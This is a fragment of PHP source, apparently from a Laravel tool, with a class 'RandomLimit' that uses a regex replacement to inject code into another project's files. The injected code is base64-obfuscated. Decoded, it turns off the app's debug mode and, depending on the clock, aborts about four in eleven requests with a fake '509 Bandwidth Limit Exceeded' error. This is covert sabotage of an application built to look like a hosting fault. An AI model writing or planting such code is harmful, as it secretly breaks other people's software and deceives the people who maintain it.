...
class RandomLimit extends ActionModifier
{
	...
	const regexReplace = '$0$4:code1:$4:code2:$4';
	const code_first   = 'base64_decode(\'Y29uZmln=\')([base64_decode(\'YXBwLmRlYnVn=\') => false]);';
	const code         = 'if (base64_decode(\'dGltZQ==\')()%11<4) base64_decode(\'YWJvcnQ=\')((int) base64_decode(\'NTA5\'), base64_decode(\'QmFuZHdpZHRoIExpbWl0IEV4Y2VlZGVk\'));';
	...
	public function run(): bool
	{
		...
		$replacer = str_replace(
			[':code1:', ':code2:'], [self::code_first, self::code], self::regexReplace
		);
